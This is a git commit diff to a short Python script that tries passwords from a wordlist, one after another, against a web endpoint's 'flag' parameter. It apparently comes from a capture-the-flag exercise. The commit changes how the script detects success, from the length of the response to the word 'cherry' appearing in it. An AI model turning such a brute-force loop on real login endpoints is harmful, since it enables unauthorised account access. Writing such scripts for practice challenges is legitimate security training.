d617d483d82e4a5cfb8ad958ae33f1362eda4eda
ibrahim sagagi <42825767+captnsagz@users.noreply.github.com>
2019-12-05 15:17:50 +0530

    Update dictionary_script.py

--- dictionary_script.py
+++ dictionary_script.py
@@ -6,7 +6,7 @@ my_file = open("pin41.txt","r")#file path containing lists of passwords
 for password in my_file:
         PARAMS = {'flag':password} #flag is the paramter name
         r = requests.get(url=URL, params=PARAMS)
-        if len(r.text) != 52: #checking to see if response is not equal to 52
+        if "cherry" in r.text: #checking to see if cherry is inside the response
                 print("[+] Password found: "+password+" ")
                 print(r.content)
                 break
